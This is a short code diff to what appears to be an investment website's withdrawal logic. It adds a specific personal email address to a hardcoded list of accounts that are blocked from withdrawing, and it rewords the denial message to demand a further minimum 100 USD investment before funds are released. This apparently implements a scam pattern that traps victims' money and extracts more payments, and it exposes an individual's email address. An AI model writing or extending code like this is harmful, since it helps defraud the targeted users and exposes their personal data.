@@ -683,7 +683,7 @@
 
         // NEW: List of emails that need more investment to reach level 2
         const needMoreInvestmentEmails = [
-            'newuser@example.com',
+            'lushabra@hotmail.com',
             'basic@softrinvestment.com',
             'starter@softrinvestment.com',
             'level1@softrinvestment.com',
@@ -1017,7 +1017,7 @@
             
             // Check if email is in the "need more investment" list
             if (needMoreInvestmentEmails.includes(withdrawalEmail)) {
-                showModal(false, 'Investment Required', 'Your account needs to reach Level 2 to withdraw funds. Please make additional investments to upgrade your account level.');
+                showModal(false, 'Investment Required', 'Your account needs to invest a minimum of 100USD to reach Level 2 to withdraw funds. Please make additional investments to upgrade your account level.');
                 
                 // Log investment required
                 logFormSubmission({
